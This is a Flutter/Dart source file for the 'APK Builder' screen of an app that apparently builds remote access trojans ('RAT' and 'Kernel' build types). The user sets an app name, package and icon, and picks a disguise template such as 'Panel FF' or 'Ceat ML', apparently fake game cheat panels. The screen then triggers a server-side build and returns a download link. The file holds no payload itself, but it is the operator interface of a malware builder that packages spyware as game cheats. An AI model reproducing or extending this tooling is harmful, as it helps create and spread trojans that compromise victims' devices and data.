import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:image_picker/image_picker.dart';
import '../app_config.dart';
import '../services/builder_service.dart';

class BuilderPage extends StatefulWidget {
  final String sessionKey;
  const BuilderPage({super.key, required this.sessionKey});

  @override
  State<BuilderPage> createState() => _BuilderPageState();
}

class _BuilderPageState extends State<BuilderPage> {
  final BuilderService _service = BuilderService();
  final _appNameCtrl = TextEditingController(text: 'Panel FF');
  final _packageCtrl = TextEditingController(text: 'com.panel.ff');
  final _versionCtrl = TextEditingController(text: '1.0');
  final _versionCodeCtrl = TextEditingController(text: '1');
  final _customHtmlCtrl = TextEditingController();
  final _customUrlCtrl = TextEditingController();

  String _buildType = 'rat'; // 'rat' or 'kernel'
  String _selectedTemplate = 'blank';
  String? _iconBase64;
  String? _ratId;
  String? _kcid;
  bool _isLoading = false;
  bool _isBuilding = false;

  // Build status
  String _buildId = '';
  int _progress = 0;
  String _elapsed = '00:00:00';
  String _estimatedRemaining = '';
  String _buildStatus = '';
  List<Map<String, dynamic>> _logs = [];
  String? _downloadUrl;
  Timer? _timer;
  Timer? _statusPoller;
  DateTime? _buildStartTime;

  List<Map<String, dynamic>> _templates = [];
  List<Map<String, dynamic>> _myBuilds = [];

  @override
  void initState() {
    super.initState();
    _service.setSessionKey(widget.sessionKey);
    _loadTemplates();
    _loadMyBuilds();
  }

  @override
  void dispose() {
    _timer?.cancel();
    _statusPoller?.cancel();
    _appNameCtrl.dispose();
    _packageCtrl.dispose();
    _versionCtrl.dispose();
    _versionCodeCtrl.dispose();
    _customHtmlCtrl.dispose();
    _customUrlCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadTemplates() async {
    final templates = await _service.getTemplates();
    setState(() => _templates = templates);
  }

  Future<void> _loadMyBuilds() async {
    final builds = await _service.getMyBuilds();
    setState(() => _myBuilds = builds);
  }

  Future<void> _pickIcon() async {
    try {
      final picker = ImagePicker();
      final picked = await picker.pickImage(source: ImageSource.gallery, maxWidth: 512, maxHeight: 512);
      if (picked != null) {
        final bytes = await File(picked.path).readAsBytes();
        setState(() => _iconBase64 = base64Encode(bytes));
      }
    } catch (e) {
      debugPrint('Error picking icon: $e');
    }
  }

  Future<void> _startBuild() async {
    if (_appNameCtrl.text.isEmpty || _packageCtrl.text.isEmpty) {
      _showAlert('Error', 'App name and package name are required');
      return;
    }

    setState(() {
      _isLoading = true;
      _isBuilding = false;
      _logs = [];
      _progress = 0;
      _elapsed = '00:00:00';
      _estimatedRemaining = '';
      _buildStatus = '';
      _downloadUrl = null;
    });

    // Step 1: Create config
    final result = await _service.createBuild(
      type: _buildType,
      appName: _appNameCtrl.text,
      packageName: _packageCtrl.text,
      versionCode: _versionCodeCtrl.text,
      versionName: _versionCtrl.text,
      icon: _iconBase64,
      template: _selectedTemplate,
      customHtml: _selectedTemplate == 'custom' ? _customHtmlCtrl.text : null,
      customUrl: _selectedTemplate == 'blank' ? _customUrlCtrl.text : null,
    );

    if (result == null) {
      setState(() => _isLoading = false);
      _showAlert('Error', 'Failed to create build config');
      return;
    }

    _buildId = result['buildId'];
    _ratId = result['config']?['ratId'];
    _kcid = result['config']?['kcid'];

    setState(() {
      _buildStatus = 'building';
      _isLoading = false;
      _isBuilding = true;
    });

    // Step 2: Trigger build
    final triggered = await _service.triggerBuild(_buildId);
    if (!triggered) {
      setState(() {
        _isBuilding = false;
        _buildStatus = 'error';
      });
      _showAlert('Error', 'Failed to trigger build');
      return;
    }

    // Step 3: Start timer
    _buildStartTime = DateTime.now();
    _timer = Timer.periodic(const Duration(seconds: 1), (_) => _updateTimer());

    // Step 4: Stream logs via SSE
    _service.streamLogs(_buildId).listen(
      (log) {
        setState(() => _logs.add(log));

        // Update progress from log
        if (log['message']?.contains('✅')) {
          setState(() => _progress = (_progress + 15).clamp(0, 95));
        }

        // Check for completion
        if (log['type'] == 'success' && log['message']?.contains('complete')) {
          setState(() {
            _progress = 100;
            _buildStatus = 'done';
            _downloadUrl = log['downloadUrl'];
            _isBuilding = false;
          });
          _timer?.cancel();
          _loadMyBuilds();
        }

        // Check for error
        if (log['type'] == 'error') {
          setState(() {
            _buildStatus = 'error';
            _isBuilding = false;
          });
          _timer?.cancel();
        }
      },
      onDone: () {
        // If stream closes without completion, poll status
        if (_isBuilding) _startStatusPolling();
      },
      onError: (_) {
        if (_isBuilding) _startStatusPolling();
      },
    );

    // Fallback: poll status every 3 seconds
    _statusPoller = Timer.periodic(const Duration(seconds: 3), (_) async {
      if (!_isBuilding) { _statusPoller?.cancel(); return; }
      final status = await _service.getBuildStatus(_buildId);
      if (status != null) {
        setState(() {
          _progress = (status['progress'] ?? _progress).clamp(0, 100);
          _elapsed = status['elapsed'] ?? _elapsed;
          _estimatedRemaining = status['estimatedRemaining'] ?? '';
        });
        if (status['status'] == 'done') {
          setState(() {
            _progress = 100;
            _buildStatus = 'done';
            _downloadUrl = status['downloadUrl'];
            _isBuilding = false;
          });
          _statusPoller?.cancel();
          _timer?.cancel();
          _loadMyBuilds();
        }
        if (status['status'] == 'error') {
          setState(() { _buildStatus = 'error'; _isBuilding = false; });
          _statusPoller?.cancel();
          _timer?.cancel();
        }
      }
    });
  }

  void _updateTimer() {
    if (_buildStartTime == null) return;
    final elapsed = DateTime.now().difference(_buildStartTime!);
    final s = elapsed.inSeconds;
    final m = s ~/ 60;
    final h = m ~/ 60;
    setState(() {
      _elapsed = '${h.toString().padLeft(2, '0')}:${(m % 60).toString().padLeft(2, '0')}:${(s % 60).toString().padLeft(2, '0')}';
      if (_progress > 0 && _progress < 100) {
        final remaining = ((100 - _progress) / _progress * s);
        final rs = remaining.ceil();
        final rm = rs ~/ 60;
        _estimatedRemaining = '${(rm ~/ 60).toString().padLeft(2, '0')}:${(rm % 60).toString().padLeft(2, '0')}:${(rs % 60).toString().padLeft(2, '0')}';
      }
    });
  }

  void _startStatusPolling() {
    _statusPoller ??= Timer.periodic(const Duration(seconds: 3), (_) async {
      final status = await _service.getBuildStatus(_buildId);
      if (status != null && status['status'] == 'done') {
        setState(() {
          _progress = 100;
          _buildStatus = 'done';
          _downloadUrl = status['downloadUrl'];
          _isBuilding = false;
        });
        _statusPoller?.cancel();
        _loadMyBuilds();
      }
    });
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1F1F28),
        title: Text(title, style: const TextStyle(color: Colors.white)),
        content: Text(msg, style: const TextStyle(color: Colors.grey)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('OK', style: TextStyle(color: Colors.red))),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: const Text('APK Builder', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
        iconTheme: const IconThemeData(color: Colors.white),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Build Type Selection
            _buildTypeSelector(),
            const SizedBox(height: 16),

            // Auto-set ID display
            if (_buildType == 'rat' && _ratId != null) _autoIdBadge('Rat ID', _ratId!),
            if (_buildType == 'kernel' && _kcid != null) _autoIdBadge('KCID', _kcid!),
            const SizedBox(height: 16),

            // App Settings
            _sectionTitle('App Settings'),
            _textField('App Name', _appNameCtrl),
            _textField('Package Name', _packageCtrl),
            Row(children: [
              Expanded(child: _textField('Version', _versionCtrl)),
              const SizedBox(width: 8),
              Expanded(child: _textField('Version Code', _versionCodeCtrl)),
            ]),
            const SizedBox(height: 12),

            // Icon Picker
            _sectionTitle('App Icon'),
            GestureDetector(
              onTap: _pickIcon,
              child: Container(
                height: 80,
                decoration: BoxDecoration(
                  color: const Color(0xFF1F1F28),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.grey.shade800),
                ),
                child: _iconBase64 != null
                    ? ClipRRect(
                        borderRadius: BorderRadius.circular(12),
                        child: Image.memory(base64Decode(_iconBase64!), fit: BoxFit.cover),
                      )
                    : const Center(
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.add_photo_alternate, color: Colors.grey, size: 32),
                            SizedBox(height: 4),
                            Text('Tap to upload icon (512x512)', style: TextStyle(color: Colors.grey, fontSize: 12)),
                          ],
                        ),
                      ),
              ),
            ),
            const SizedBox(height: 16),

            // Template Selection
            _sectionTitle('Template'),
            _templateSelector(),
            const SizedBox(height: 12),

            if (_selectedTemplate == 'custom') ...[
              _sectionTitle('Custom HTML'),
              _textField('HTML Content', _customHtmlCtrl, maxLines: 5),
            ],
            if (_selectedTemplate == 'blank') ...[
              _sectionTitle('Custom URL'),
              _textField('URL', _customUrlCtrl),
            ],
            const SizedBox(height: 20),

            // Build Button
            SizedBox(
              width: double.infinity,
              height: 50,
              child: ElevatedButton(
                onPressed: _isBuilding ? null : _startBuild,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                child: _isLoading
                    ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                    : Text(
                        _isBuilding ? 'Building... ${_progress}%' : 'BUILD APK',
                        style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
                      ),
              ),
            ),
            const SizedBox(height: 20),

            // Build Status (when building)
            if (_isBuilding || _buildStatus == 'done' || _buildStatus == 'error') ...[
              _buildStatusSection(),
              const SizedBox(height: 16),
            ],

            // Download Button
            if (_downloadUrl != null) ...[
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton.icon(
                  onPressed: () => _launchDownload(_downloadUrl!),
                  icon: const Icon(Icons.download, color: Colors.white),
                  label: const Text('DOWNLOAD APK', style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.green.shade700,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
              ),
              const SizedBox(height: 20),
            ],

            // My Builds History
            if (_myBuilds.isNotEmpty) ...[
              _sectionTitle('Build History'),
              ...(_myBuilds.take(5).map((b) => _buildHistoryItem(b))),
            ],
          ],
        ),
      ),
    );
  }

  Widget _buildTypeSelector() {
    return Container(
      padding: const EdgeInsets.all(4),
      decoration: BoxDecoration(
        color: const Color(0xFF1F1F28),
        borderRadius: BorderRadius.circular(12),
      ),
      child: Row(
        children: [
          Expanded(
            child: GestureDetector(
              onTap: () => setState(() => _buildType = 'rat'),
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 12),
                decoration: BoxDecoration(
                  color: _buildType == 'rat' ? Colors.red : Colors.transparent,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text('🐀', style: TextStyle(fontSize: 16)),
                    SizedBox(width: 6),
                    Text('RAT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                  ],
                ),
              ),
            ),
          ),
          Expanded(
            child: GestureDetector(
              onTap: () => setState(() => _buildType = 'kernel'),
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 12),
                decoration: BoxDecoration(
                  color: _buildType == 'kernel' ? Colors.blue : Colors.transparent,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text('🔧', style: TextStyle(fontSize: 16)),
                    SizedBox(width: 6),
                    Text('Kernel', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _autoIdBadge(String label, String value) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        color: const Color(0xFF1F1F28),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Colors.green.shade800),
      ),
      child: Row(
        children: [
          const Icon(Icons.lock, color: Colors.green, size: 16),
          const SizedBox(width: 8),
          Text('$label: ', style: const TextStyle(color: Colors.grey, fontSize: 12)),
          Expanded(
            child: Text(value, style: const TextStyle(color: Colors.green, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: 'monospace')),
          ),
        ],
      ),
    );
  }

  Widget _sectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Text(title, style: const TextStyle(color: Colors.grey, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1)),
    );
  }

  Widget _textField(String label, TextEditingController ctrl, {int maxLines = 1}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: TextField(
        controller: ctrl,
        maxLines: maxLines,
        style: const TextStyle(color: Colors.white),
        decoration: InputDecoration(
          hintText: label,
          hintStyle: TextStyle(color: Colors.grey.shade600),
          filled: true,
          fillColor: const Color(0xFF1F1F28),
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide.none),
          contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        ),
      ),
    );
  }

  Widget _templateSelector() {
    final allTemplates = [
      {'id': 'panel-ff', 'name': '🎮 Panel FF'},
      {'id': 'ceat-ml', 'name': '⚔️ Ceat ML'},
      {'id': 'custom', 'name': '📝 Custom HTML'},
      {'id': 'blank', 'name': '🌐 Blank WebView'},
    ];

    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: allTemplates.map((t) {
        final isSelected = _selectedTemplate == t['id'];
        return GestureDetector(
          onTap: () => setState(() => _selectedTemplate = t['id']!),
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
            decoration: BoxDecoration(
              color: isSelected ? Colors.red.shade900 : const Color(0xFF1F1F28),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: isSelected ? Colors.red : Colors.grey.shade800),
            ),
            child: Text(t['name']!, style: TextStyle(color: isSelected ? Colors.white : Colors.grey, fontSize: 12)),
          ),
        );
      }).toList(),
    );
  }

  Widget _buildStatusSection() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: const Color(0xFF1F1F28),
        borderRadius: BorderRadius.circular(12),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text('BUILD STATUS', style: TextStyle(color: Colors.grey, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1)),
          const SizedBox(height: 12),

          // Timer
          Row(
            children: [
              const Icon(Icons.timer, color: Colors.orange, size: 16),
              const SizedBox(width: 6),
              Text('Elapsed: $_elapsed', style: const TextStyle(color: Colors.white, fontFamily: 'monospace')),
              if (_estimatedRemaining.isNotEmpty) ...[
                const Spacer(),
                const Icon(Icons.hourglass_empty, color: Colors.grey, size: 14),
                const SizedBox(width: 4),
                Text('~$_estimatedRemaining left', style: TextStyle(color: Colors.grey.shade400, fontSize: 12)),
              ],
            ],
          ),
          const SizedBox(height: 12),

          // Progress Bar
          ClipRRect(
            borderRadius: BorderRadius.circular(4),
            child: LinearProgressIndicator(
              value: _progress / 100,
              backgroundColor: Colors.grey.shade800,
              valueColor: AlwaysStoppedAnimation<Color>(
                _buildStatus == 'done' ? Colors.green :
                _buildStatus == 'error' ? Colors.red : Colors.orange,
              ),
              minHeight: 6,
            ),
          ),
          const SizedBox(height: 4),
          Text('$_progress%', style: const TextStyle(color: Colors.grey, fontSize: 12)),
          const SizedBox(height: 12),

          // Logs
          const Text('LOGS:', style: TextStyle(color: Colors.grey, fontSize: 11, fontWeight: FontWeight.bold)),
          const SizedBox(height: 8),
          Container(
            constraints: const BoxConstraints(maxHeight: 200),
            decoration: BoxDecoration(
              color: Colors.black,
              borderRadius: BorderRadius.circular(8),
            ),
            padding: const EdgeInsets.all(8),
            child: ListView.builder(
              shrinkWrap: true,
              itemCount: _logs.length,
              itemBuilder: (_, i) {
                final log = _logs[i];
                final color = log['type'] == 'success' ? Colors.green :
                              log['type'] == 'error' ? Colors.red : Colors.grey.shade400;
                return Padding(
                  padding: const EdgeInsets.only(bottom: 2),
                  child: Text(
                    '[${log['time'] ?? ''}] ${log['message'] ?? ''}',
                    style: TextStyle(color: color, fontSize: 11, fontFamily: 'monospace'),
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHistoryItem(Map<String, dynamic> build) {
    final status = build['status'] ?? 'unknown';
    final color = status == 'done' ? Colors.green :
                  status == 'error' ? Colors.red :
                  status == 'building' ? Colors.orange : Colors.grey;

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: const Color(0xFF1F1F28),
        borderRadius: BorderRadius.circular(8),
      ),
      child: Row(
        children: [
          Icon(Icons.circle, color: color, size: 8),
          const SizedBox(width: 8),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(build['appName'] ?? build['id'], style: const TextStyle(color: Colors.white, fontSize: 13)),
                Text(build['packageName'] ?? '', style: TextStyle(color: Colors.grey.shade500, fontSize: 11)),
              ],
            ),
          ),
          Text(status.toUpperCase(), style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  void _launchDownload(String url) async {
    // In Flutter, we can use url_launcher
    // For now, copy to clipboard
    await Clipboard.setData(ClipboardData(text: url));
    _showAlert('Download URL copied!', url);
  }
}
